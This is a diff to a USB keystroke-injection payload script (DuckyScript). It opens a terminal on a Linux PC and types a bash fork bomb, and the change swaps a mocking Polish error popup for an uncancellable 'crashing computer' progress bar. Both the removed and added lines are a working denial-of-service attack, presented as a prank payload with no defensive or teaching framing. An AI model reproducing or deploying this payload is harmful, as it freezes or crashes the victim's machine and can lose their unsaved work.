@@ -4,6 +4,6 @@ REM DESCRIPTION Runs a fork bomb on a linux pc.
 
 CTRL-ALT t
 DELAY 1000
-STRING :(){ :|:& };: && zenity --error --text="Nie zamkniesz mnie!" --title="HAHAHA" & exit
+STRING :(){ :|:& };: & zenity --progress --pulsate --no-cancel --text="Crashowanie komputera..." & exit
 ENTER
 
